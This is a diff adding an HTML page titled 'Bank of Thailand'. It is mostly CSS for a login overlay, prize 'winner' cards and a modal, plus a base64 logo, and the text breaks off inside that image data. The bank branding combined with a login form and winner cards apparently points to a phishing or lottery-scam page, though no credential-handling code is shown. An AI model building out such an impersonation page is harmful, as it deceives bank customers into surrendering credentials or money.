@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bank of Thailand </title>
+    </title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: 
+                linear-gradient(120deg, #e6f0fa 0%, #f4f6f8 100%),
+                url('https://www.transparenttextures.com/patterns/cubes.png');
+            background-repeat: repeat;
+            background-size: auto, cover;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+        header {
+            background: linear-gradient(90deg, #003366 60%, #0055a5 100%);
+            color: #fff;
+            padding: 40px 0 22px 0;
+            text-align: center;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+            letter-spacing: 1px;
+            border-bottom: 4px solid #ffd700;
+            position: relative;
+        }
+        header::after {
+            content: "";
+            display: block;
+            position: absolute;
+            left: 0; right: 0; bottom: 0;
+            height: 8px;
+            background: linear-gradient(90deg, #ffd700 0%, #0055a5 100%);
+            opacity: 0.3;
+        }
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 8px;
+            font-weight: 700;
+            letter-spacing: 2px;
+        }
+        header p {
+            font-size: 1.2rem;
+            font-weight: 400;
+            opacity: 0.85;
+        }
+        nav {
+            background: #0055a5;
+            padding: 12px 0;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        nav a {
+            color: #fff;
+            margin: 0 18px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.08rem;
+            padding: 8px 16px;
+            border-radius: 6px;
+            transition: background 0.2s, color 0.2s;
+        }
+        nav a:hover, nav a:focus {
+            background: #003366;
+            color: #ffd700;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 38px auto 80px auto;
+            background: #fff;
+            padding: 38px 32px;
+            border-radius: 14px;
+            box-shadow: 0 4px 24px rgba(0,85,165,0.10);
+            position: relative;
+            z-index: 1;
+        }
+        .container h2 {
+            font-size: 2rem;
+            color: #003366;
+            margin-bottom: 28px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        .feature {
+            flex: 1 1 220px;
+            margin: 0 10px 24px 10px;
+            background: linear-gradient(120deg, #e6f0fa 60%, #f4f6f8 100%);
+            padding: 24px 18px;
+            border-radius: 10px;
+            box-shadow: 0 2px 12px rgba(0,85,165,0.09);
+            text-align: center;
+            transition: transform 0.18s, box-shadow 0.18s;
+            position: relative;
+            overflow: hidden;
+            opacity: 0; /* Initially hidden */
+            transform: translateY(20px); /* Move down slightly */
+            transition: opacity 0.5s, transform 0.5s; /* Smooth transition */
+        }
+        .feature:hover {
+            transform: translateY(-6px) scale(1.03);
+            box-shadow: 0 8px 32px rgba(0,85,165,0.16);
+            background: linear-gradient(120deg, #d0e6fa 60%, #e6f0fa 100%);
+        }
+        .feature h3 {
+            color: #0055a5;
+            font-size: 1.18rem;
+            margin-bottom: 14px;
+            font-weight: 700;
+        }
+        .feature button {
+            display: block;
+            width: 90%;
+            margin: 8px auto;
+            padding: 10px 0;
+            background: linear-gradient(90deg, #0055a5 70%, #003366 100%);
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,85,165,0.09);
+            transition: background 0.2s, color 0.2s, box-shadow 0.2s;
+        }
+        .feature button:hover, .feature button:focus {
+            background: linear-gradient(90deg, #ffd700 60%, #0055a5 100%);
+            color: #003366;
+            box-shadow: 0 4px 16px rgba(0,85,165,0.14);
+        }
+        .feature p {
+            font-size: 1.05rem;
+            color: #333;
+            margin-bottom: 8px;
+            opacity: 0.85;
+        }
+        /* Shorten the height of specific cards */
+        .feature.short-card {
+            padding: 12px 10px; /* Reduce padding */
+            margin: 0 10px 12px 10px; /* Reduce margin */
+            height: auto; /* Ensure the height adjusts to content */
+        }
+
+        .feature.short-card h3 {
+            font-size: 1rem; /* Slightly smaller heading */
+            margin-bottom: 8px;
+        }
+
+        .feature.short-card p {
+            font-size: 0.9rem; /* Slightly smaller text */
+            margin-bottom: 6px;
+        }
+
+        .feature.short-card button {
+            padding: 8px 0; /* Reduce button padding */
+            font-size: 0.9rem; /* Slightly smaller button text */
+        }
+        /* Login Form Styles */
+        .login-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(0, 85, 165, 0.10);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .login-container {
+            background: #fff;
+            padding: 44px 36px;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,85,165,0.18);
+            min-width: 320px;
+            max-width: 370px;
+            text-align: center;
+            position: relative;
+        }
+        .login-container h2 {
+            margin-bottom: 28px;
+            color: #003366;
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 7px;
+            font-weight: 600;
+            color: #0055a5;
+            font-size: 1rem;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 11px 13px;
+            border: 1px solid #b0c4de;
+            border-radius: 7px;
+            font-size: 1.08rem;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            box-shadow: 0 1px 4px rgba(0,85,165,0.06);
+        }
+        .form-group input:focus {
+            border-color: #0055a5;
+            outline: none;
+            box-shadow: 0 2px 8px rgba(0,85,165,0.12);
+        }
+        .login-btn {
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(90deg, #0055a5 70%, #003366 100%);
+            color: #fff;
+            border: none;
+            border-radius: 7px;
+            font-size: 1.08rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s, color 0.2s, box-shadow 0.2s;
+            box-shadow: 0 2px 8px rgba(0,85,165,0.09);
+        }
+        .login-btn:hover, .login-btn:focus {
+            background: linear-gradient(90deg, #ffd700 60%, #0055a5 100%);
+            color: #003366;
+            box-shadow: 0 4px 16px rgba(0,85,165,0.14);
+        }
+        .back-link {
+            display: inline-block;
+            margin-top: 20px;
+            color: #0055a5;
+            text-decoration: none;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+        .back-link:hover {
+            text-decoration: underline;
+            color: #003366;
+        }
+        footer {
+            background: linear-gradient(90deg, #003366 60%, #0055a5 100%);
+            color: #fff;
+            text-align: center;
+            padding: 18px 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+            font-size: 1.08rem;
+            letter-spacing: 1px;
+            box-shadow: 0 -2px 12px rgba(0,0,0,0.08);
+        }
+        .winner-card {
+            background: linear-gradient(120deg, #f4f6f8 60%, #e6f0fa 100%);
+            padding: 24px 18px;
+            border-radius: 10px;
+            box-shadow: 0 2px 12px rgba(0,85,165,0.09);
+            text-align: center;
+            margin: 20px auto;
+            max-width: 400px;
+            transition: transform 0.18s, box-shadow 0.18s;
+        }
+        .winner-card:hover {
+            transform: translateY(-6px) scale(1.03);
+            box-shadow: 0 8px 32px rgba(0,85,165,0.16);
+        }
+        .winner-card h3 {
+            color: #0055a5;
+            font-size: 1.5rem;
+            margin-bottom: 14px;
+            font-weight: 700;
+        }
+        .winner-card p {
+            font-size: 1.1rem;
+            color: #333;
+            margin-bottom: 8px;
+            opacity: 0.85;
+        }
+        .winner-photo {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 16px;
+            border: 3px solid #0055a5;
+        }
+        @media (max-width: 900px) {
+            .container {
+                max-width: 98vw;
+                padding: 18px 2vw;
+            }
+            .features {
+                flex-direction: column;
+            }
+            .feature {
+                margin: 0 0 18px 0;
+            }
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px 2vw;
+            }
+            .login-container {
+                min-width: 90vw;
+                padding: 24px 8vw;
+            }
+            header h1 {
+                font-size: 1.5rem;
+            }
+            .feature h3 {
+                font-size: 1rem;
+            }
+        }
+        /* Modal Styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent background */
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: #fff;
+            padding: 20px 30px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .modal-content h2 {
+            font-size: 1.8rem;
+            color: #003366;
+            margin-bottom: 16px;
+        }
+
+        .modal-content p {
+            font-size: 1.2rem;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .modal-content button {
+            background: #0055a5;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .modal-content button:hover {
+            background: #003366;
+        }
+    </style>
+</head>
+<body>
+    <header>
+    <div style="display: flex; align-items: center; justify-content: center; gap: 16px;">
+        <img src="data:image/jpeg;base64,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